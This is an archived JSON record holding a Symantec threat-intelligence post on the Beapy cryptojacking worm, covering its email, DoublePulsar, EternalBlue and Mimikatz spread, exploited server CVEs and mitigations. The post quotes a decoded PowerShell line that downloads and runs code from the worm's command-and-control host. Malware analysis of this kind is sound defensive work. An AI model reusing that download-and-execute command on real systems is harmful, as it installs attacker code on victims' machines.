{
    "id": "b4dc9905-c4bd-4b2d-98b2-f0e44744077a",
    "created_at": "2023-01-12T15:06:29.715002Z",
    "updated_at": "2025-03-27T02:11:47.740325Z",
    "deleted_at": null,
    "sha1_hash": "57c326d113ddbf7ddcd40edd162a6c45a4c9bfdc",
    "title": "2019-04-24 - Beapy- Cryptojacking Worm Hits Enterprises in China",
    "authors": "",
    "file_creation_date": "2022-05-28T21:59:29Z",
    "file_modification_date": "2022-05-28T21:59:29Z",
    "file_size": 1567318,
    "plain_text": "# Beapy: Cryptojacking Worm Hits Enterprises in China\n\n**[symantec.com/blogs/threat-intelligence/beapy-cryptojacking-worm-china](https://www.symantec.com/blogs/threat-intelligence/beapy-cryptojacking-worm-china)**\n\n\n-----\n\nThreat Hunter TeamSymantec\n\n## Cryptojacking campaign we have dubbed Beapy is exploiting the EternalBlue exploit and primarily impacting enterprises in China.\n\nBeapy is a cryptojacking campaign impacting enterprises that uses the EternalBlue exploit\nand stolen and hardcoded credentials to spread rapidly across networks. Beapy activity was\nfirst seen in Symantec telemetry in January 2019. This activity has also been seen on web\nservers and has been increasing since the beginning of March.\n\n[Beapy (W32.Beapy) is a file-based coinminer that uses email as an initial infection vector.](https://www.symantec.com/security-center/writeup/2019-040311-4417-99)\nThis campaign demonstrates that while cryptojacking has declined in popularity with cyber\ncriminals since its peak at the start of 2018, it is still a focus for some of them, with\nenterprises now their primary target.\n\nAlmost all of Beapy’s victims are enterprises (Figure 1). Beapy may indicate a continuation of\n[a trend demonstrated by the Bluwimps worm (MSH.Bluwimps) in 2018 and which we](https://www.symantec.com/security-center/writeup/2018-020707-5228-99)\n[mentioned in ISTR 24—an increased focus by cryptojacking criminals on enterprises. While](http://go.symantec.com/istr)\nwe have no evidence these attacks are targeted, Beapy’s wormlike capabilities indicate that\nit was probably always intended to spread throughout enterprise networks.\n\nFigure 1. Enterprise vs\n\nconsumer infections of Beapy\n\n\n-----\n\n[This mirrors a trend we saw in ransomware in 2018 too when, despite a drop in overall](http://go.symantec.com/istr)\nransomware infections of 20 percent, ransomware infections in enterprises increased by 12\npercent. Enterprises appear to be an increasing focus for cyber criminals.\n\nBeapy is most heavily affecting enterprises in Asia, with more than 80 percent of its victims\nlocated in China, with other victims in South Korea, Japan, and Vietnam.\n\nFigure 2. Beapy infections by region\n\n## Infection chain\n\n\n-----\n\nMalicious emails are the initial vector for at least some Beapy infections. A malicious Excel\ndocument is delivered to victims as an email attachment. If the email recipient opens the\n[malicious attachment, the DoublePulsar backdoor (Backdoor.Doublepulsar) is downloaded](https://www.symantec.com/security-center/writeup/2017-042122-0603-99)\nonto the target machine. DoublePulsar, like EternalBlue, was leaked in the Shadow Brokers\n[dump and was also used in the destructive WannaCry ransomware attack in 2017.](https://www.symantec.com/blogs/threat-intelligence/wannacry-ransomware-attack)\nDoublePulsar opens a backdoor on infected machines and allows for remote code execution\non compromised computers. EternalBlue exploits a vulnerability in the Windows SMB\nprotocol to allow files to spread laterally across networks.\n\nOnce DoublePulsar is installed, a PowerShell command is executed, and contact is made\nwith the Beapy command and control (C&C) server, before a coinminer is downloaded onto\nthe target computer. If we look at one example of a machine in Symantec telemetry, we see\nthe earliest signs of suspicious activity on February 15, 2019, when the DoublePulsar\nbackdoor is detected. We then see a PowerShell command being launched, which decodes\nto the following:\n\n```\nIEX (New-Object\n\n```\n```\n   Net.WebClient).downloadstring(' http://v.beahh.com/v' +$env:USERDOMAIN)\n\n```\nThis is the device contacting the Beapy C&C server. Some more PowerShell commands are\nexecuted and then a Monero coinminer is downloaded. This process is repeated as Beapy\nspreads to other computers on the network.\n\nBeapy appears to use unpatched machines to get a foothold on the network, and then uses\nEternalBlue to spread to other machines. However, EternalBlue isn’t Beapy’s only\n[propagation technique, and it also uses the credential-stealing tool Hacktool.Mimikatz to](https://www.symantec.com/security-center/writeup/2012-042615-3731-99)\nattempt to collect credentials from infected computers. It can use those to spread to even\npatched machines on the network. Beapy also uses a hardcoded list of usernames and\npasswords to attempt to spread across networks. This is similar to how the Bluwimps worm\noperated. Bluwimps infected thousands of enterprise machines with coinminers in 2017 and\n2018.\n\n## Web servers\n\nSymantec telemetry also found an earlier version of Beapy on a public-facing web server,\nwith the worm then attempting to spread to computers connected to that server. One of the\nways it appears to do this is by generating a list of IP addresses it attempts to infect.\n\nThe version of Beapy seen on the web server is an early version of the malware, coded in C\nrather than Python, like later versions. However, the activity is similar, with the downloaded\nmalware also containing Mimikatz modules for credential harvesting, as well as EternalBlue\nexploit capabilities.\n\n\n-----\n\nIn the web server compromise, Beapy also attempted to exploit an Apache Struts\n[vulnerability (CVE-2017-5638). This vulnerability was patched in 2017, but if successfully](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)\nexploited it can allow for remote code execution. Beapy also tried to exploit known\n[vulnerabilities in Apache Tomcat (CVE-2017-12615) and the Oracle WebLogic Server (CVE-](https://nvd.nist.gov/vuln/detail/CVE-2017-12615)\n2017-10271). In the case of this web server compromise observed by Symantec, exploit\nattempts began in early February, with connections to Beapy’s C&C server first observed on\nMarch 13. Activity targeting this web server continued until early April.\n\nIn general, Beapy activity has been increasing since the beginning of March.\n\nFigure 3. A sharp increase in Beapy detections is clearly visible\n\n## What does Beapy’s activity tell us?\n\nDespite the drop in cryptojacking activity in 2018, when there was a 52 percent drop in\ncryptojacking, this is still an area of interest for cyber criminals. Looking at the overall figures\nfor cryptojacking, we can see that there were just under 3 million cryptojacking attempts in\nMarch 2019. While a big drop from the peak of February 2018, when there were 8 million\ncryptojacking attempts, it is still a significant figure.\n\n\n-----\n\nFigure 4. Cryptojacking activity, January 2018 to March 2019\nBeapy is a file-based coinminer, which is interesting as most of the cryptojacking activity we\n[saw at the height of its popularity was carried out using browser-based coinminers, which](https://www.symantec.com/blogs/threat-intelligence/browser-mining-cryptocurrency)\nwere popular due to lower barriers to entry and because they allowed even fully patched\nmachines to be targeted. The announcement that the Coinhive coin-mining service, which\nwas launched in September 2017 and played a key role in the growth of cryptojacking, was\nclosing down also probably contributed to the fall in browser-based cryptojacking. The\nservice, which made it a lot easier for anyone to carry out browser-based coin mining,\n[ceased operations at the start of March. The shuttering of this service is likely to have a](https://www.theverge.com/2019/2/28/18244636/coinhive-cryptojacking-cryptocurrency-mining-shut-down-monero-date)\ndramatic impact on browser-based cryptojacking.\n\nAs well as these factors, file-based coinminers also have a significant advantage over\nbrowser-based coinminers because they can mine cryptocurrency faster. The Monero\ncryptocurrency, which is the cryptocurrency most commonly mined during cryptojacking\nattacks, dropped in value by 90 percent in 2018, so it may make sense that miners that can\ncreate more cryptocurrency faster are now more popular with cyber criminals.\n\n\n-----\n\nFigure 5. Comparing profitability of browser-based and file-based coin-mining botnets\n\n## Effects of cryptojacking on enterprises\n\nWhile enterprises might think they don’t need to worry about cryptojacking as much as more\ndisruptive threats such as ransomware, it could still have a major impact on the company’s\noperations.\n\nPotential impacts of cryptojacking for businesses include:\n\nA slowdown in devices’ performance, potentially leading to employee frustration and a\nreduction in productivity\nOverheating batteries\nDevices becoming degraded and unusable, leading to higher IT costs\n\n\n-----\n\nIncreased costs due to increased electricity usage, and for businesses operating in the\ncloud that are billed based on CPU usage\n\nEnterprises need to ensure their networks are protected from the whole range of cyber\nsecurity threats.\n\n## Mitigation\n\nEmphasize multiple, overlapping, and mutually supportive defensive systems to guard\nagainst single point failures in any specific technology or protection method. This\nincludes deployment of endpoint, email, and web gateway protection technologies as\nwell as firewalls and vulnerability assessment solutions. Always keep these security\nsolutions up to date with the latest protection capabilities.\nEducate anyone using your device or network and urge them to exercise caution\naround emails from unfamiliar sources and around opening attachments that haven’t\nbeen solicited, which may contain file-based coin-mining malware.\nEducate employees about the signs that indicate their computer may have a coinminer\nand instruct them to inform IT immediately if they think there may be a coinminer on a\ndevice that is on the company network.\nMonitor battery usage on your device and, if you notice a suspicious spike in usage,\nscan it for the presence of any file-based miners.\nInstall the latest patches on your devices, use strong passwords and enable two-factor\nauthentication.\n\n## Protection\n\nSymantec has the following protection in place to protect customers against these kinds of\nattacks:\n\n[W32.Beapy](https://www.symantec.com/security-center/writeup/2019-040311-4417-99)\n[Hacktool.Mimikatz](https://www.symantec.com/security-center/writeup/2012-042615-3731-99)\n[MSH.Bluwimps](https://www.symantec.com/security-center/writeup/2018-020707-5228-99)\n[Backdoor.Doublepulsar](https://www.symantec.com/security-center/writeup/2017-042122-0603-99)\n\nSymantec [Email Security.cloud technology blocks email spreading this threat using](https://www.symantec.com/products/email-security-cloud)\nadvanced heuristics.\n\n## Further Reading\n\nFor more information about cryptojacking, read our whitepaper:\n\n[Cryptojacking: A Modern Cash Cow](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-cryptojacking-modern-cash-cow-en.pdf)\n\n## File Attachments\n\n\n-----\n\n[Beapy IOCsTXT3.08 KB](https://symantec-enterprise-blogs.security.com/sites/default/files/2019-04/Beapy_IOCs.txt)\n\nBroadcomSymantec Enterprise Blogs\nYou might also enjoy\n\nThreat Intelligence4 Min Read\n\n## Cryptojacking: A Modern Cash Cow\n\n### Cryptojacking shook up the cyber security landscape in 2017 and 2018. We take an in-depth look at this cyber crime trend.\n\n## About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to\ninvestigate targeted attacks, drive enhanced protection in Symantec products, and offer\nanalysis that helps customers respond to attacks.\n\n## Want to comment on this post?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-04-24 - Beapy- Cryptojacking Worm Hits Enterprises in China.pdf"
    ],
    "report_names": [
        "2019-04-24 - Beapy- Cryptojacking Worm Hits Enterprises in China.pdf"
    ],
    "threat_actors": [
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535989,
    "ts_updated_at": 1743041507,
    "ts_creation_date": 1653775169,
    "ts_modification_date": 1653775169,
    "files": {
        "pdf": "https://archive.orkl.eu/57c326d113ddbf7ddcd40edd162a6c45a4c9bfdc.pdf",
        "text": "https://archive.orkl.eu/57c326d113ddbf7ddcd40edd162a6c45a4c9bfdc.txt",
        "img": "https://archive.orkl.eu/57c326d113ddbf7ddcd40edd162a6c45a4c9bfdc.jpg"
    }
}